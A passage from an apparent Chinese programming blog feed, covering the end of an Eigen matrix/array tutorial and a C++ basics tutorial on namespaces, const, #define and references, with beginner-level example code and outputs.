href="#七、在数组和矩阵表达式之间转换" class="headerlink" title="七、在数组和矩阵表达式之间转换"></a><strong>七、在数组和矩阵表达式之间转换</strong></h2><p>什么时候应该使用Matrix类的对象？何时应该使用Array类的对象？您不能对数组应用Matrix运算，也不能对矩阵应用Array运算。因此，如果你需要进行矩阵乘法等线性代数运算，那么你应该使用矩阵; 如果你需要进行系数运算，那么你应该使用数组。但是，有时它并不那么简单，但您需要同时使用Matrix和Array操作。在这种情况下，您需要将矩阵转换为数组或反向转换。无论选择将对象声明为数组还是矩阵，都可以访问所有操作。</p><p>矩阵表达式有一个**.array（）方法**，可以将它们“转换”为数组表达式，因此可以轻松应用系数方法。相反，数组表达式具有**.matrix（）方法**。与所有Eigen表达式抽象一样，这没有任何运行时成本（假设您让编译器进行优化）。即.array（）和.matrix（）可被用作右值和作为左值。</p><p>Eigen禁止在表达式中混合矩阵和数组。例如，您无法直接添加矩阵和数组; 该规则的例外是赋值运算符：允许将矩阵表达式赋给数组变量，或者将数组表达式赋给矩阵变量。</p><p><strong>以下示例说明如何通过使用.array（）方法对Matrix对象使用数组操作</strong></p><p><strong>示例代码1：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    MatrixXf m(2,2);    MatrixXf n(2,2);    MatrixXf result(2,2);    m &lt;&lt; 1,2,            3,4;    n &lt;&lt; 5,6,            7,8;    result = m * n;    cout &lt;&lt; &quot;-- Matrix m*n: --&quot; &lt;&lt; endl &lt;&lt; result &lt;&lt; endl &lt;&lt; endl;    result = m.array() * n.array();    cout &lt;&lt; &quot;-- Array m*n: --&quot; &lt;&lt; endl &lt;&lt; result &lt;&lt; endl &lt;&lt; endl;    result = m.cwiseProduct(n);    cout &lt;&lt; &quot;-- With cwiseProduct: --&quot; &lt;&lt; endl &lt;&lt; result &lt;&lt; endl &lt;&lt; endl;    result = m.array() + 4;    cout &lt;&lt; &quot;-- Array m + 4: --&quot; &lt;&lt; endl &lt;&lt; result &lt;&lt; endl &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">-- Matrix m*n: --19 2243 50-- Array m*n: -- 5 1221 32-- With cwiseProduct: -- 5 1221 32-- Array m + 4: --5 67 8</code></pre><p>类似地，如果array1和array2是数组，那么表达式array1.matrix() * array2.matrix()计算它们的矩阵乘积。</p><p><strong>示例代码2：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    MatrixXf m(2,2);    MatrixXf n(2,2);    MatrixXf result(2,2);    m &lt;&lt; 1,2,            3,4;    n &lt;&lt; 5,6,            7,8;    result = (m.array() + 4).matrix() * m;    cout &lt;&lt; &quot;-- Combination 1: --&quot; &lt;&lt; endl &lt;&lt; result &lt;&lt; endl &lt;&lt; endl;    result = (m.array() * n.array()).matrix() * m;    cout &lt;&lt; &quot;-- Combination 2: --&quot; &lt;&lt; endl &lt;&lt; result &lt;&lt; endl &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">-- Combination 1: --23 3431 46-- Combination 2: -- 41  58117 170</code></pre><p>求矩阵的行列式</p><h2 id="八、实例应用"><a href="#八、实例应用" class="headerlink" title="八、实例应用"></a><strong>八、实例应用</strong></h2><h3 id="1-求矩阵的行列式"><a href="#1-求矩阵的行列式" class="headerlink" title="1. 求矩阵的行列式"></a><strong>1. 求矩阵的行列式</strong></h3><pre><code class="hljs">m.determinant()</code></pre><p>**注意:**矩阵m要是double 类型，要不然报错</p><p>下面是我写的一个生成 32x32 位 01 可逆矩阵的类，这里面我在生成32位矩阵的时候使用的是矩阵的拼接技术，但是这样就会出现大量的数组，并且不能用循环实现，很尴尬。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;#include &lt;cstdlib&gt;#include &lt;ctime&gt;#include &lt;cmath&gt;using namespace Eigen;using namespace std;typedef Matrix &lt;double,32,32&gt; Matrix32d;class cM32&#123;public:    Matrix32d create()&#123;//返回一个可逆的32x32 随机 01 矩阵        Matrix32d m = createPT32();        if(check(m)) &#123;            cout &lt;&lt; &quot;可逆 &quot; &lt;&lt; &quot;行列式为： &quot; &lt;&lt; m.determinant() &lt;&lt; endl;            return m;        &#125;else&#123;            cout &lt;&lt; &quot;不可逆&quot; &lt;&lt; endl;            create();        &#125;    &#125;private:    Matrix32d createPT32()&#123;//创建一个随机的32x32 的01矩阵        Matrix32d m5;        Matrix2d* arrayM =  new Matrix2d[256];        for(int i=0;i&lt;256;i++)&#123;            arrayM[i] = create2();        &#125;        m5 &lt;&lt; arrayM[0], arrayM[1], arrayM[2], arrayM[3], arrayM[4], arrayM[5], arrayM[6], arrayM[7], arrayM[8], arrayM[9], arrayM[10], arrayM[11], arrayM[12], arrayM[13], arrayM[14], arrayM[15], arrayM[16],                arrayM[17], arrayM[18], arrayM[19], arrayM[20], arrayM[21], arrayM[22], arrayM[23], arrayM[24], arrayM[25], arrayM[26], arrayM[27], arrayM[28], arrayM[29], arrayM[30], arrayM[31], arrayM[32],                arrayM[33], arrayM[34], arrayM[35], arrayM[36], arrayM[37], arrayM[38], arrayM[39], arrayM[40], arrayM[41], arrayM[42], arrayM[43], arrayM[44], arrayM[45], arrayM[46], arrayM[47], arrayM[48],                arrayM[49], arrayM[50], arrayM[51], arrayM[52], arrayM[53], arrayM[54], arrayM[55], arrayM[56], arrayM[57], arrayM[58], arrayM[59], arrayM[60], arrayM[61], arrayM[62], arrayM[63], arrayM[64],                arrayM[65], arrayM[66], arrayM[67], arrayM[68], arrayM[69], arrayM[70], arrayM[71], arrayM[72], arrayM[73], arrayM[74], arrayM[75], arrayM[76], arrayM[77], arrayM[78], arrayM[79], arrayM[80],                arrayM[81], arrayM[82], arrayM[83], arrayM[84], arrayM[85], arrayM[86], arrayM[87], arrayM[88], arrayM[89], arrayM[90], arrayM[91], arrayM[92], arrayM[93], arrayM[94], arrayM[95], arrayM[96],                arrayM[97], arrayM[98], arrayM[99], arrayM[100], arrayM[101], arrayM[102], arrayM[103], arrayM[104], arrayM[105], arrayM[106], arrayM[107], arrayM[108], arrayM[109], arrayM[110], arrayM[111],                arrayM[112], arrayM[113], arrayM[114], arrayM[115], arrayM[116], arrayM[117], arrayM[118], arrayM[119], arrayM[120], arrayM[121], arrayM[122], arrayM[123], arrayM[124], arrayM[125], arrayM[126],                arrayM[127], arrayM[128], arrayM[129], arrayM[130], arrayM[131], arrayM[132], arrayM[133], arrayM[134], arrayM[135], arrayM[136], arrayM[137], arrayM[138], arrayM[139], arrayM[140], arrayM[141],                arrayM[142], arrayM[143], arrayM[144], arrayM[145], arrayM[146], arrayM[147], arrayM[148], arrayM[149], arrayM[150], arrayM[151], arrayM[152], arrayM[153], arrayM[154], arrayM[155], arrayM[156],                arrayM[157], arrayM[158], arrayM[159], arrayM[160], arrayM[161], arrayM[162], arrayM[163], arrayM[164], arrayM[165], arrayM[166], arrayM[167], arrayM[168], arrayM[169], arrayM[170], arrayM[171],                arrayM[172], arrayM[173], arrayM[174], arrayM[175], arrayM[176], arrayM[177], arrayM[178], arrayM[179], arrayM[180], arrayM[181], arrayM[182], arrayM[183], arrayM[184], arrayM[185], arrayM[186],                arrayM[187], arrayM[188], arrayM[189], arrayM[190], arrayM[191], arrayM[192], arrayM[193], arrayM[194], arrayM[195], arrayM[196], arrayM[197], arrayM[198], arrayM[199], arrayM[200], arrayM[201],                arrayM[202], arrayM[203], arrayM[204], arrayM[205], arrayM[206], arrayM[207], arrayM[208], arrayM[209], arrayM[210], arrayM[211], arrayM[212], arrayM[213], arrayM[214], arrayM[215], arrayM[216],                arrayM[217], arrayM[218], arrayM[219], arrayM[220], arrayM[221], arrayM[222], arrayM[223], arrayM[224], arrayM[225], arrayM[226], arrayM[227], arrayM[228], arrayM[229], arrayM[230], arrayM[231],                arrayM[232], arrayM[233], arrayM[234], arrayM[235], arrayM[236], arrayM[237], arrayM[238], arrayM[239], arrayM[240], arrayM[241], arrayM[242], arrayM[243], arrayM[244], arrayM[245], arrayM[246],                arrayM[247], arrayM[248], arrayM[249], arrayM[250], arrayM[251], arrayM[252], arrayM[253], arrayM[254], arrayM[255];        return m5;    &#125;    Matrix2d create2()&#123;//创建 2x2 的01随机矩阵        Matrix2d m1;        m1(0,0) = rand()%2;        m1(1,0) = rand()%2;        m1(0,1) = rand()%2;        m1(1,1) = rand()%2;        return m1;    &#125;    int check(Matrix32d m)&#123;//检查是不是可逆的        if(fabs(m.determinant()))&#123;            return 1;        &#125;else&#123;            return 0;        &#125;    &#125;&#125;;int main()&#123;    srand((unsigned int)time(NULL));    cM32 *m = new cM32;    for(int i=0;i&lt;1000;i++)&#123;        m-&gt;create();    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 C++ 类库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++ 基础教程</title>
    <link href="/2018/10/11/C++%20%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <url>/2018/10/11/C++%20%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="一、第一个C-程序"><a href="#一、第一个C-程序" class="headerlink" title="一、第一个C++ 程序"></a><strong>一、第一个C++ 程序</strong></h2><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std; //使用标准的命名空间，在这个空间中有很多的标准定义int  main()&#123;    //cout 其实就代表那个黑色的输出框  &lt;&lt; 表示输入  endl 表示 \n    cout &lt;&lt; &quot;hello world&quot; &lt;&lt; endl;    return 0;&#125;</code></pre><span id="more"></span><p><strong>结果：</strong></p><pre><code class="hljs">hello world</code></pre><p><strong>注意：</strong></p><p>cout cin  都要写在 &lt;&lt; 或者 &gt;&gt; 的左边</p><h2 id="二、通过一个程序理解面向对象"><a href="#二、通过一个程序理解面向对象" class="headerlink" title="二、通过一个程序理解面向对象"></a><strong>二、通过一个程序理解面向对象</strong></h2><p>我们想通过两种方式实现求解圆的周长和面积这一个小程序，来理解和区别面向对象和面向过程</p><h3 id="1-面向过程："><a href="#1-面向过程：" class="headerlink" title="1.面向过程："></a><strong>1.面向过程：</strong></h3><pre><code class="hljs">#include &quot;iostream&quot;using namespace std; //使用标准的命名空间，在这个空间中有很多的标准定义int  main()&#123;    double r = 0;    double s = 0;    cout &lt;&lt; &quot;请输入圆的半径：&quot;;    cin &gt;&gt; r;    cout &lt;&lt; &quot;圆的半径是：&quot; &lt;&lt; r &lt;&lt; endl;    s = 3.14*r*r;    cout &lt;&lt; &quot;圆的面积是：&quot; &lt;&lt; s &lt;&lt; endl;&#125;</code></pre><h3 id="2-面向对象："><a href="#2-面向对象：" class="headerlink" title="2.面向对象："></a><strong>2.面向对象：</strong></h3><pre><code class="hljs">#include &quot;iostream&quot;using namespace std; //使用标准的命名空间，在这个空间中有很多的标准定义class Circle&#123;public:    double m_r;    double m_s;public:    void setR(double r)&#123;        m_r = r;    &#125;    double getR()&#123;        return m_r;    &#125;    double getS()&#123;        m_s = 3.14*m_r*m_r;        return m_s;    &#125;&#125;;int main()&#123;    Circle c1;    double r;    cout &lt;&lt; &quot;请输入圆的半径:&quot;;    cin &gt;&gt; r;    c1.setR(r);    cout &lt;&lt; &quot;圆的面积是：&quot; &lt;&lt; c1.getS() &lt;&lt;endl;&#125;</code></pre><h3 id="3-总结分析"><a href="#3-总结分析" class="headerlink" title="3.总结分析"></a><strong>3.总结分析</strong></h3><p>1.类代码不是一步一步执行的<br>2.类是一个数据类型（是固定大小内存块的别名），定义类的时候是不会分配内存空间的，只有当实例化的时候才会分配内存空间</p><h3 id="4-类中不写成员函数的错误模型"><a href="#4-类中不写成员函数的错误模型" class="headerlink" title="4.类中不写成员函数的错误模型"></a><strong>4.类中不写成员函数的错误模型</strong></h3><pre><code class="hljs">class Circle&#123;public:    double r;    double pi = 3.1415926;    double area = p1*r*r; &#125;int main()&#123;    Circle c1;    cout &lt;&lt; &quot;请输入圆的半径：&quot;；    cin &gt;&gt; c1.r;    cout &lt;&lt; &quot;圆的面积：&quot; &lt;&lt; c1.area &lt;&lt; endl;&#125;</code></pre><p>这个程序编译的时候会报错，后期版本的编译器不报错，但是拿到的是一个随机值，为什么？</p><p><strong>解释：</strong></p><p>在类对象初始化的时候，会给类对象分配内存，但是此时，r 是一个不确定的值，area 等号右面的语句也是在初始化的时候才会执行，这个执行的结果就是一个不确定的值，而后面我们再给 r 传值并不会影响 area ，因为他是属性，在引用的时候是不会执行的，他只会拿着之前的那个不确定的值给我们。（意思就是说，对象的方法在未调用的时候是不会执行的）</p><h2 id="三、C-对-C-的扩展"><a href="#三、C-对-C-的扩展" class="headerlink" title="三、C++ 对 C 的扩展"></a><strong>三、C++ 对 C 的扩展</strong></h2><h3 id="1-namespace-的出现"><a href="#1-namespace-的出现" class="headerlink" title="1.namespace 的出现"></a><strong>1.namespace 的出现</strong></h3><h4 id="1-namespace-常识"><a href="#1-namespace-常识" class="headerlink" title="1.namespace 常识"></a><strong>1.namespace 常识</strong></h4><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/namespace%20%E5%B8%B8%E8%AF%86.png" alt="此处输入图片的描述"></p><h4 id="2-namespace-的定义"><a href="#2-namespace-的定义" class="headerlink" title="2.namespace 的定义"></a><strong>2.namespace 的定义</strong></h4><p>namespace 是各种标识符的可见范围，所谓 name 可以代表的是 符号常量、变量、宏、函数、结构、枚举、类和对象等 ，为了避免在大规模的程序设计和调用各种的库的时候出现命名冲突才引入了 namespace,std 是 c++ 的标准命名空间，c++ 标准程序库中的所有标识符都定义在std ，比如 iostream ,使用时使用 using namespace std; std::string;</p><h4 id="3-namespace-使用实例："><a href="#3-namespace-使用实例：" class="headerlink" title="3.namespace 使用实例："></a><strong>3.namespace 使用实例：</strong></h4><p><strong>1.示例一：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;int main() &#123;    std::cout &lt;&lt; &quot;Hello, World!&quot; &lt;&lt; std::endl;    return 0;&#125;</code></pre><p>我们看到这程序和之前程序的不同，我们没有定义 namespace 结果我们就需要使用 std::cout ，因为 cout 就定义在 std 中</p><p><strong>2.示例二：</strong></p><p>我们能自定义命名空间，还能在命名空间中嵌套定义命名空间</p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;namespace namespaceA&#123;    int a = 10;&#125;namespace namespaceB&#123;    int b = 20;    namespace namespcaeC&#123;        struct Teacher&#123;            char name[32];            int age;        &#125;;    &#125;&#125;int main() &#123;    cout &lt;&lt; namespaceA::a &lt;&lt; endl;    cout &lt;&lt; namespaceB::b &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1020</code></pre><h4 id="4-注意："><a href="#4-注意：" class="headerlink" title="4.注意："></a><strong>4.注意：</strong></h4><p>C中的命名空间是全局的，为了和C区分开，C++ 规定不允许使用 带有 .h 的头文件</p><h3 id="2-实用性加强"><a href="#2-实用性加强" class="headerlink" title="2.实用性加强"></a><strong>2.实用性加强</strong></h3><p>C语言中的变量必须在作用域的开始定义，但是C++ 为了强调实用性可以在使用前定义</p><h3 id="3-register-关键字增强"><a href="#3-register-关键字增强" class="headerlink" title="3.register 关键字增强"></a><strong>3.register 关键字增强</strong></h3><h4 id="1-register-的作用是什么呢？"><a href="#1-register-的作用是什么呢？" class="headerlink" title="1.register 的作用是什么呢？"></a><strong>1.register 的作用是什么呢？</strong></h4><p>请求编译器让变量直接放在寄存器中，速度更快</p><p>因为寄存器是没法取地址的，因此在C语言中下面的代码会报错</p><p><strong>实例：</strong></p><pre><code class="hljs">void main()&#123;    register int a = 0;    printf(&quot;&amp;a = %d&quot;,&amp;a);&#125;</code></pre><p>c++ 就比较特殊，它支持这个关键字，但是即使是不用这个关键字也会进行优化，但是c++ 编译器取 register 修饰的变量的地址的时候能取到（实际上它自动的将这个register 设置为无效）</p><h3 id="4-变量检测增强"><a href="#4-变量检测增强" class="headerlink" title="4.变量检测增强"></a><strong>4.变量检测增强</strong></h3><p>C语言中有很多的灰色地带，比如下面的代码：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int a ;int a = 100;int main()&#123;    printf(&quot;a = %d&quot;,a);&#125;</code></pre><p>这样的代码在C 程序中是不会报错的，甚至还能打印出100，但是在C++ 编译器看来这个是明显不合法的</p><h3 id="5-struct类型的增强"><a href="#5-struct类型的增强" class="headerlink" title="5.struct类型的增强"></a><strong>5.struct类型的增强</strong></h3><p>在C编译器看来，struct 并不是一个新的类型，比如我们定义了一个 struct Teacher{…}, 到函数中声明一个变量的时候不能直接是  Teacher xxx; 必须是 struct Teacher xxx; 但是在 C++ 编译器中是允许的。</p><p><strong>注意:</strong></p><p>在 C++ 中 struct 关键字和  class 关键字完成的功能是一样的，在struct 中也能加上 访问控制修饰符</p><h3 id="6-C-中变量和函数都必须有类型"><a href="#6-C-中变量和函数都必须有类型" class="headerlink" title="6.C++ 中变量和函数都必须有类型"></a><strong>6.C++ 中变量和函数都必须有类型</strong></h3><p>也就是说，C++ 对类型的检查将更加严格</p><blockquote><p><strong>C 中有一些灰色地带：</strong></p><p>1.函数定义的时候没有定义形参，但是调用的时候却能传递各种参数，还不报错<br>2.接受一个没有类型形参，传进去值还能打印</p></blockquote><p>C++ 中变量和函数都必须有类型，C语言中的默认类型在C++ 中是不成立的</p><h3 id="7-C-中新增-Bool-关键字"><a href="#7-C-中新增-Bool-关键字" class="headerlink" title="7.C++ 中新增 Bool 关键字"></a><strong>7.C++ 中新增 Bool 关键字</strong></h3><p>1.bool 类型在内存中只占据一个字节的空间 sizeof(bool) &#x3D;&#x3D; 1<br>2.bool 类型变量只有两个值，一或者零，不管赋值是多少</p><h3 id="8-三目运算符在C-和-C-编译器中的表现"><a href="#8-三目运算符在C-和-C-编译器中的表现" class="headerlink" title="8.三目运算符在C 和 C++ 编译器中的表现"></a><strong>8.三目运算符在C 和 C++ 编译器中的表现</strong></h3><p>在C语言中，表达式是不能做左值的，因为表达式的结果是放在寄存器中的或者说C编译器认为表达式的结果是一个变量的值。因此下面的代码就会报错</p><pre><code class="hljs">int main()&#123;     int a = 10;     int b = 20;          (a  &lt;b ? a :b) = 100;     return 0;&#125;</code></pre><p>但是 C++ 编译器认为表达式的结果是变量本身，因此上面的代码在C++ 编译器中将会 给 a 赋值100</p><p><strong>补充:那么C++编译器是怎么实现的呢？</strong></p><p><strong>推演代码：</strong></p><pre><code class="hljs">*(a &lt; b ? &amp;a :&amp;b) = 100;</code></pre><h2 id="四、C-和-C-中的-const"><a href="#四、C-和-C-中的-const" class="headerlink" title="四、C 和 C++ 中的 const"></a><strong>四、C 和 C++ 中的 const</strong></h2><h3 id="1-C语言中的-const-是一个冒牌货"><a href="#1-C语言中的-const-是一个冒牌货" class="headerlink" title="1.C语言中的 const 是一个冒牌货"></a><strong>1.C语言中的 const 是一个冒牌货</strong></h3><p>之前在 C 编程进阶的文章中说道，虽然我们给一个变量设置为 const 但是我们还是能通过指针间接地修改他的值（当然这个时候需要强制类型转换成 int* ）</p><p>但是C ++ 中 同样的代码，你用指针间接地修改是不能实现的，打印出来的还是原来的值</p><h3 id="2-为什么呢？"><a href="#2-为什么呢？" class="headerlink" title="2.为什么呢？"></a><strong>2.为什么呢？</strong></h3><p>C++ 编译器在检测到定义了const 常量以后，就会为这个常量在符号表中分配一块空间，并以键值对的形式存在，每次取的时候都会从符号表中取，当你对这个常量取地址的时候，C++ 编译器会为其重新分配一块内存空间，我们通过指针改变其值的时候改变的不过是那块新的内存空间，与符号表无关，因此最后的结果不会改变</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/const%20%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="此处输入图片的描述"></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;   const int a = 10;   int * p = NULL;   p = (int *)&amp;a;   *p =20;   cout &lt;&lt; &quot;a 的值：&quot; &lt;&lt; a &lt;&lt;endl;   cout &lt;&lt; &quot;*p的值：&quot; &lt;&lt; *p &lt;&lt;endl;    system(&quot;pause&quot;);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a 的值：10*p的值：20</code></pre><blockquote><p><strong>注意：</strong></p><p>C++ 中的 const 可能分配内存空间也可能不分配内存空间， (1)当const 常量为全局并且在其他文件中使用的时候 (2)使用&amp;<br>操作符取 常量的地址</p></blockquote><h3 id="3-const-和-define的相同之处"><a href="#3-const-和-define的相同之处" class="headerlink" title="3.const 和 #define的相同之处"></a><strong>3.const 和 #define的相同之处</strong></h3><p>C 和 C++ 编译器中普通变量是不能做数组下标的，但是 gcc 中支持</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;    int a = 10;    int b = 20;    int array[a+b];    system(&quot;pause&quot;);&#125;</code></pre><p>但是如果我们将变量生命成 const 就可以了，这个和#define 的功能是类似的</p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;    const int a = 10;    const int b = 20;    int array[a+b];    system(&quot;pause&quot;);&#125;</code></pre><h3 id="4-C-中-const-和-define的不同之处"><a href="#4-C-中-const-和-define的不同之处" class="headerlink" title="4.C++ 中 const 和 #define的不同之处"></a><strong>4.C++ 中 const 和 #define的不同之处</strong></h3><p>const 常量是由编译器处理的，提供类型检查和作用域检查，宏定义是由预处理器处理的，单纯的文本替换</p><p>那么什么叫做作用域检查呢？作用域检查就是#define 是全局的，但是 const 只能在函数内部使用</p><h4 id="1-define-的使用"><a href="#1-define-的使用" class="headerlink" title="1.define 的使用"></a><strong>1.define 的使用</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;void f1()&#123;#define a 10    const int b = 20;&#125;void f2()&#123;    printf(&quot;a = %d\n&quot;,a);&#125;int main() &#123;    f1();    f2();    system(&quot;pause&quot;);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a = 10</code></pre><h4 id="2-const-的使用"><a href="#2-const-的使用" class="headerlink" title="2.const 的使用"></a><strong>2.const 的使用</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;void f1()&#123;#define a 10    const int b = 20;&#125;void f2()&#123;    //printf(&quot;a = %d\n&quot;,a);    printf(&quot;b = %d\n&quot;,b);&#125;int main() &#123;    f1();    f2();    system(&quot;pause&quot;);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs"> error: &#39;b&#39; was not declared in this scope    printf(&quot;b = %d\n&quot;,b);</code></pre><h2 id="五、C-中的引用"><a href="#五、C-中的引用" class="headerlink" title="五、C++ 中的引用"></a><strong>五、C++ 中的引用</strong></h2><h3 id="1-引出："><a href="#1-引出：" class="headerlink" title="1.引出："></a><strong>1.引出：</strong></h3><p>我们知道变量是内存空间的别名，那么一块内存空间只能有一个别名吗？能不能有多个呢？答案是可以的，这个技术在C++ 中就叫做引用</p><h3 id="2-语法："><a href="#2-语法：" class="headerlink" title="2.语法："></a><strong>2.语法：</strong></h3><pre><code class="hljs">Type &amp; name = var ;</code></pre><p>name 在这里就是对 var 的引用，修改name 的值就是在修改 var 的值</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;    int a = 10;    int &amp; b =  a;    b = 100;    cout &lt;&lt; &quot;b 的值为：&quot; &lt;&lt; b &lt;&lt;endl;    cout &lt;&lt; &quot;a 的值为：&quot; &lt;&lt; a &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">b 的值为：100a 的值为：100</code></pre><p><strong>注意:</strong></p><p>引用是 C++ 的语法范畴，请不要用C 的理解方式去看这个语法</p><h3 id="3-引用做函数参数："><a href="#3-引用做函数参数：" class="headerlink" title="3.引用做函数参数："></a><strong>3.引用做函数参数：</strong></h3><h4 id="1-引用必须依附于某一个变量"><a href="#1-引用必须依附于某一个变量" class="headerlink" title="1.引用必须依附于某一个变量"></a>1.引用必须依附于某一个变量</h4><p>下面的语法是错误的：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    int &amp; b ;&#125;</code></pre><h4 id="2-利用引用交换变量的值"><a href="#2-利用引用交换变量的值" class="headerlink" title="2.利用引用交换变量的值"></a><strong>2.利用引用交换变量的值</strong></h4><p>我们在C语言中交换变量的值一般是用指针作为函数参数实现的，在 C++ 中可以用引用的方式</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;void myswap(int &amp; a ,int &amp; b)&#123;    int c;    c =a;    a = b;    b = c;&#125;int main() &#123;    int a = 10;    int b = 20;    myswap(a,b);    cout &lt;&lt; &quot;a 的值为：&quot; &lt;&lt; a &lt;&lt; endl;    cout &lt;&lt; &quot;b 的值为：&quot; &lt;&lt; b &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a 的值为：20b 的值为：10</code></pre><h4 id="3-复杂数据引用做函数参数"><a href="#3-复杂数据引用做函数参数" class="headerlink" title="3.复杂数据引用做函数参数"></a><strong>3.复杂数据引用做函数参数</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;struct Teacher&#123;    int age;&#125;;void change(Teacher &amp; PT)&#123;    PT.age = 24;&#125;int main() &#123;    struct Teacher t1;    change(t1);    cout &lt;&lt; &quot;T1 的年龄是：&quot; &lt;&lt; t1.age &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">T1 的年龄是：24 </code></pre><h4 id="4-引用的意义"><a href="#4-引用的意义" class="headerlink" title="4.引用的意义"></a><strong>4.引用的意义</strong></h4><p>(1)引用作为别名存在，在一些场合能很好地替代指针<br>(2)引用相对于指针来讲有更好的可读性和实用性</p><h4 id="5-引用的本质"><a href="#5-引用的本质" class="headerlink" title="5.引用的本质"></a><strong>5.引用的本质</strong></h4><p><strong>1.引用就是通一块内存空间的门牌号</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int main() &#123;    int a = 10;    int &amp; b = a;    cout &lt;&lt; &quot;&amp;a = &quot; &lt;&lt; &amp;a &lt;&lt;endl;    cout &lt;&lt; &quot;&amp;b = &quot; &lt;&lt; &amp;b &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&amp;a = 0x61ff18&amp;b = 0x61ff18</code></pre><p><strong>2.引用变量是否占据内存空间呢？</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;struct Teacher&#123;    char name[64];//64    int age;      //4    int &amp; a;      //?    int &amp; b;      //?&#125;;int main() &#123;    cout &lt;&lt; &quot;sizeof(Teacher) = &quot; &lt;&lt; sizeof(Teacher) &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">sizeof(Teacher) = 76</code></pre><p>我们可以清楚地看到，引用变量占据了4个字节的内存空间</p><h4 id="6-综上所述"><a href="#6-综上所述" class="headerlink" title="6.综上所述"></a><strong>6.综上所述</strong></h4><p>鉴于以下两点：</p><p>(1)引用在声明的时候必定要初始化，很像 const 常量<br>(2)引用变量也占据内存空间， 很像一个指针</p><p>于是我们其实就可以把引用看成是 一个常量指针  ： </p><pre><code class="hljs">    Type * const p;</code></pre><p>在使用的时候，引用会让人误以为是个别名没有占用空间，这其实是C++ 为了实用性的考虑故意设计的隐藏</p><h3 id="4-函数的返回值是引用："><a href="#4-函数的返回值是引用：" class="headerlink" title="4.函数的返回值是引用："></a><strong>4.函数的返回值是引用：</strong></h3><p>当函数返回值为引用的时候，如果返回的是栈变量，可能会出现一些问题，记得不要作为其他引用的初始值（根据我在 C 编程进阶中讲的，栈区变量会在调用结束的时候被销毁，引用本身也是一个指针，只不过隐藏的比较深 ）</p><p>但是如果返回值是个全局变量或者静态变量，那么这个时候作为一个引用是没有问题的</p><p><strong>注意：</strong></p><p>返回值是引用的时候，返回的是变量本身，因此可以做左值</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;int &amp; getA1()&#123;    static int a = 10;    return a;&#125;int main() &#123;    getA1() = 100;    cout &lt;&lt; &quot;a 的值是:&quot; &lt;&lt; getA1() &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a 的值是:100</code></pre><blockquote><p><strong>注意：</strong></p><p>我这个变量是 static 如果是普通的变量实际上是会报错的</p></blockquote><h3 id="5-指针的引用"><a href="#5-指针的引用" class="headerlink" title="5.指针的引用"></a><strong>5.指针的引用</strong></h3><p>引用一个指针就是相当于一个二级指针，就能直接操纵指针的指向</p><p><strong>示例代码:</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;struct Teacher&#123;    char name[64];    int age;&#125;;int getTeacher2(Teacher* &amp; myp)&#123;    //myp 是一个指针的引用，相当于是一个二级指针    myp = (Teacher*)malloc(sizeof(Teacher));    if(myp == NULL)&#123;        return -1;    &#125;    myp-&gt;age = 24;&#125;void FreeTeacher(Teacher* pT1)&#123;    if(pT1 == NULL)&#123;        return;    &#125;        free(pT1);    &#125;int main() &#123;    Teacher *pT1 = NULL;    getTeacher2(pT1);    cout &lt;&lt; &quot;Teacher 的年龄是：&quot; &lt;&lt; pT1-&gt;age &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">Teacher 的年龄是：24</code></pre><h3 id="6-常量的引用"><a 